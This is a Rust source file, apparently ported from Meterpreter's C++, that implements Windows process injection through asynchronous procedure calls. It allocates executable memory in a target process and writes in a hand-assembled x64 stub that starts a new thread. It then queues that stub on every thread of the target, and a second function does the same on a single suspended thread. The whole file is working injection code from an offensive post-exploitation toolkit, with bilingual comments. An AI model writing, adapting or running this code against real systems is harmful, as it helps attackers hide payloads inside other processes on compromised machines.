//! 移植自 src/inject_apcthread.cpp —— 通过附加到 Windows 线程上的
//! 异步过程调用（APC）队列进行进程注入（取自 Meterpreter）。
//! Port of src/inject_apcthread.cpp — process injection with an
//! Asynchronous Procedure Call queue attached to Windows threads
//! (taken from Meterpreter).
//!
//! 该技术将一个小型 stub（`_migrateit`）加上一个 `APCCONTEXT` 复制到
//! 目标进程中，并向目标 PID 的每个线程队列一个 APC。stub 在目标进程内
//! 触发时，会检查线程的 ActivationContextStackPointer；如果有效，就通过
//! 上下文中存储的 `CreateThread` 指针新建一个线程，使原线程保持正常运行。
//! The technique copies a small stub (`_migrateit`) plus an `APCCONTEXT`
//! into the target process and queues an APC on every thread of the target
//! PID. The stub, when it fires inside the target, checks the thread's
//! ActivationContextStackPointer and, if valid, creates a fresh thread via
//! the `CreateThread` pointer stored in the context so the original thread
//! keeps functioning normally.
//!
//! C++ 通过复制编译后函数的字节来获得 `_migrateit` 的机器码。Rust 移植版
//! 面向 x64，因此以手工汇编的 x64 字节数组提供等价 stub，行为完全一致
//! （相同的 APCCONTEXT 布局、相同的 TEB 偏移 0x2C8 用于
//! ActivationContextStackPointer、相同的 `fired` 标志协议）。
//! The C++ obtains `_migrateit`'s machine code by copying the compiled
//! function's bytes. The Rust port targets x64, so the equivalent stub is
//! provided as a hand-assembled x64 byte array with identical behaviour
//! (same APCCONTEXT layout, same TEB offset 0x2C8 for
//! ActivationContextStackPointer, same `fired` flag protocol).

use crate::inject::InjectContext;
use std::ffi::c_void;
use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
use windows_sys::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use windows_sys::Win32::System::Threading::{
    CreateThread, OpenThread, ResumeThread, Sleep, THREAD_ALL_ACCESS,
};

// 为 x64 编译的 `_migrateit` stub（见模块文档）。RCX 持有 APCCONTEXT 指针；
// 结构体偏移：lpStartAddress=0、lpParameter=8、pCreateThread=16、
// fired=24（BOOL，4 字节，结构体填充到 32）。
// The `_migrateit` stub compiled for x64 (see module docs). RCX holds the
// APCCONTEXT pointer; struct offsets: lpStartAddress=0, lpParameter=8,
// pCreateThread=16, fired=24 (BOOL, 4 bytes, struct padded to 32).
const MIGRATEIT_STUB: [u8; 87] = [
    // 将 fired 标志加载到 eax。
    // mov eax, [rcx+24]                    ; context->fired
    0x8B, 0x41, 0x18,
    // 测试 eax 是否为 0。
    // test eax, eax
    0x85, 0xC0,
    // 非零则跳转到 done（已触发过）。
    // jnz done
    0x75, 0x4F,
    // 将 fired 标志置为 TRUE。
    // mov dword ptr [rcx+24], 1            ; context->fired = TRUE
    0xC7, 0x41, 0x18, 0x01, 0x00, 0x00, 0x00,
    // 获取 TEB（NT_TIB.Self）。
    // mov rax, gs:[0x30]                   ; TEB (NT_TIB.Self)
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00,
    // 检查 teb->actctx 是否为 NULL。
    // cmp qword ptr [rax+0x2C8], 0         ; teb->actctx == NULL?
    0x48, 0x83, 0xB8, 0xC8, 0x02, 0x00, 0x00, 0x00,
    // 非 NULL 则跳转到 do_create。
    // jnz do_create
    0x75, 0x08,
    // 将 fired 标志置为 FALSE（未触发）。
    // mov dword ptr [rcx+24], 0            ; context->fired = FALSE
    0xC7, 0x41, 0x18, 0x00, 0x00, 0x00, 0x00,
    // 返回。
    // ret
    0xC3,
    // do_create：保存旧栈帧。
    // do_create: push rbp
    0x55,
    // 建立新栈帧。
    // mov rbp, rsp
    0x48, 0x8B, 0xEC,
    // 分配影子空间 + 2 个栈参数，保持 16 字节对齐。
    // sub rsp, 0x30                        ; shadow space + 2 stack args, keeps 16-byte alignment
    0x48, 0x83, 0xEC, 0x30,
    // 取出 context->pCreateThread。
    // mov rax, [rcx+16]                    ; context->pCreateThread
    0x48, 0x8B, 0x41, 0x10,
    // 取出 lpStartAddress。
    // mov r8, [rcx]                        ; lpStartAddress
    0x4C, 0x8B, 0x01,
    // 取出 lpParameter。
    // mov r9, [rcx+8]                      ; lpParameter
    0x4C, 0x8B, 0x49, 0x08,
    // lpThreadAttributes = NULL。
    // xor ecx, ecx                         ; lpThreadAttributes = NULL
    0x33, 0xC9,
    // dwStackSize = 0。
    // xor edx, edx                         ; dwStackSize = 0
    0x33, 0xD2,
    // lpThreadId = NULL。
    // mov qword ptr [rsp+0x28], 0          ; lpThreadId = NULL
    0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00,
    // dwCreationFlags = 0。
    // mov qword ptr [rsp+0x20], 0          ; dwCreationFlags = 0
    0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
    // 调用 pCreateThread(...)。
    // call rax                             ; pCreateThread(...)
    0xFF, 0xD0,
    // 恢复栈帧。
    // leave
    0xC9,
    // 返回。
    // ret
    0xC3,
    // done：返回。
    // done: ret
    0xC3,
];

/// 镜像到目标进程中的上下文（APCCONTEXT）。布局必须与 C 结构体完全一致：
/// 三个指针，然后是 BOOL `fired`。
/// The context mirrored into the target process (APCCONTEXT). Layout must
/// match the C struct exactly: three pointers, then the BOOL `fired`.
#[repr(C)]
#[derive(Clone, Copy)]
struct ApcContext {
    lp_start_address: *mut c_void,
    lp_parameter: *mut c_void,
    p_create_thread: *mut c_void,
    fired: i32,
}

/// NtQueueApcThread 的函数原型：
/// NTSTATUS NtQueueApcThread(HANDLE, PVOID, PVOID, PVOID, PVOID)。
/// NTSTATUS NtQueueApcThread(HANDLE, PVOID, PVOID, PVOID, PVOID).
type NtQueueApcThread = unsafe extern "system" fn(HANDLE, *mut c_void, *mut c_void, *mut c_void, *mut c_void) -> i32;

/// 把 APC 上下文和 `_migrateit` stub 合并到远程进程中的一个内存块里
/// （copycontext）。需要 RWX，因为 stub 会修改 `fired` 参数。
/// Combine the APC context and the `_migrateit` stub into one block in the
/// remote process (copycontext). RWX is necessary because the stub modifies
/// the `fired` parameter.
unsafe fn copycontext(h_process: isize, _pid: u32, context: &ApcContext) -> *mut u8 {
    let fnsize = MIGRATEIT_STUB.len();
    let size = fnsize + std::mem::size_of::<ApcContext>();

    // 将 APC 上下文和函数合并到一处。
    /* combine the apc context and the function into one place */
    let mut ctx_local = Vec::<u8>::with_capacity(size);
    let ctx_bytes = std::slice::from_raw_parts(
        context as *const ApcContext as *const u8,
        std::mem::size_of::<ApcContext>(),
    );
    ctx_local.extend_from_slice(ctx_bytes);
    ctx_local.extend_from_slice(&MIGRATEIT_STUB);

    // RWX 是必要的，因为我们要修改 fired 参数。
    /* RWX is necessary because we modify the parameter fired */
    let ctx_remote = VirtualAllocEx(
        h_process as HANDLE,
        std::ptr::null(),
        size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE,
    );

    // 写入我们的进程内存。
    /* write our process memory */
    let mut result = ctx_remote;
    let mut wrote: usize = 0;
    if !ctx_remote.is_null()
        && WriteProcessMemory(
            h_process as HANDLE,
            ctx_remote,
            ctx_local.as_ptr() as *const c_void,
            size,
            &mut wrote,
        ) != 0
    {
        if wrote != size {
            result = std::ptr::null_mut(); /* TODO: should ctx_remote be released in the remote process */
        }
    }

    result as *mut u8
}

/// 在目标进程的每个线程上队列 APC stub（inject_via_apcthread）。
/// 假定注入的是同架构进程。
/// Queue the APC stub on every thread of the target process
/// (inject_via_apcthread). Assumes injection into a same-arch process.
pub fn inject_via_apcthread(injctx: &mut InjectContext, lp_start_address: *mut c_void, lp_parameter: *mut c_void) -> bool {
    unsafe {
        let ntdll = GetModuleHandleA(b"ntdll\0".as_ptr());
        if ntdll.is_null() {
            return false;
        }
        let Some(p_nt_queue_apc_thread) = GetProcAddress(ntdll, b"NtQueueApcThread\0".as_ptr()) else {
            return false;
        };
        let p_nt_queue_apc_thread: NtQueueApcThread = std::mem::transmute(p_nt_queue_apc_thread);

        // 设置我们的上下文……假定我们注入的是同架构进程。
        /* setup our context... assumes we're injecting into a same arch process */
        let mut ctx: ApcContext = std::mem::zeroed();
        ctx.lp_start_address = lp_start_address;
        ctx.lp_parameter = lp_parameter;
        ctx.p_create_thread = CreateThread as *const () as *mut c_void;
        ctx.fired = 0;

        // 好，我们走到这一步了，让我们镜像上下文。
        /* OK, we made it this far, let's mirror our context */
        let remote_context = copycontext(injctx.h_process, injctx.pid, &ctx);
        if remote_context.is_null() {
            return false;
        }

        // 对部分线程拍一个快照。
        /* take a snapshot of some threads */
        let h_thread_snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if h_thread_snap.is_null() {
            return false;
        }

        let mut t: THREADENTRY32 = std::mem::zeroed();
        t.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

        if Thread32First(h_thread_snap, &mut t) == 0 {
            return false;
        }

        loop {
            // 只有当我们针对的是目标进程中的线程时才继续。
            /* Only proceed if we are targeting a thread in the target process */
            if t.th32OwnerProcessID == injctx.pid {
                // 打开此线程的句柄，以便进行 APC 注入。
                /* Open a handle to this thread so we can do the apc injection */
                let h_thread = OpenThread(THREAD_ALL_ACCESS, 0, t.th32ThreadID);
                if !h_thread.is_null() {
                    // 队列我们的 APC 方法。
                    /* queue our APC method */
                    p_nt_queue_apc_thread(
                        h_thread,
                        (remote_context as usize + std::mem::size_of::<ApcContext>()) as *mut c_void,
                        remote_context as *mut c_void,
                        std::ptr::null_mut(),
                        std::ptr::null_mut(),
                    );

                    // 关闭句柄。
                    /* close the handle */
                    CloseHandle(h_thread);
                }
            }

            if Thread32Next(h_thread_snap, &mut t) == 0 {
                break;
            }
        }

        // 也销毁我们的线程快照。
        /* kill our thread snapshot too */
        CloseHandle(h_thread_snap);

        // 等待……
        /* wait... */
        Sleep(200);

        // 读取 APC 上下文，判断我们是成功还是失败。
        /* read the APC context to determine if we succeeded or failed */
        let mut x: usize = 0;
        if ReadProcessMemory(
            injctx.h_process as HANDLE,
            remote_context as *const c_void,
            &mut ctx as *mut ApcContext as *mut c_void,
            std::mem::size_of::<ApcContext>(),
            &mut x,
        ) == 0
            || x != std::mem::size_of::<ApcContext>()
        {
            return false;
        }

        // 如果没有触发，就让它以后也不会意外触发。
        /* if we did not fire, make it so we don't accidentally kick off later */
        if ctx.fired == 0 {
            // 更新，使以后的唤醒不会再尝试任何操作。
            ctx.fired = 1; /* update so that future wake-ups don't try anything */
            WriteProcessMemory(
                injctx.h_process as HANDLE,
                remote_context as *const c_void,
                &ctx as *const ApcContext as *const c_void,
                std::mem::size_of::<ApcContext>(),
                &mut x,
            );
            return false;
        }

        // ctx.fired == 1，所以很可能已成功触发。
        /* ctx.fired == 1, so we probably fired successfully */
        true
    }
}

/// 在上下文中单个挂起线程句柄上队列 APC，然后恢复它
/// （inject_via_apcthread_targeted）。
/// Queue the APC on the single suspended thread handle in the context and
/// resume it (inject_via_apcthread_targeted).
pub fn inject_via_apcthread_targeted(ictx: &mut InjectContext, lp_start_address: *mut c_void, lp_parameter: *mut c_void) -> bool {
    unsafe {
        let ntdll = GetModuleHandleA(b"ntdll\0".as_ptr());
        if ntdll.is_null() {
            return false;
        }
        let Some(p_nt_queue_apc_thread) = GetProcAddress(ntdll, b"NtQueueApcThread\0".as_ptr()) else {
            return false;
        };
        let p_nt_queue_apc_thread: NtQueueApcThread = std::mem::transmute(p_nt_queue_apc_thread);

        // 添加到目标线程的 APC 队列。
        /* add to the APC queue of the target thread */
        if p_nt_queue_apc_thread(
            ictx.h_thread as HANDLE,
            lp_start_address,
            lp_parameter,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        ) != 0
        {
            return false;
        }

        // 尝试恢复线程……失败就放弃。
        /* try to resume the thread... punt if it fails */
        ResumeThread(ictx.h_thread as HANDLE) != u32::MAX
    }
}
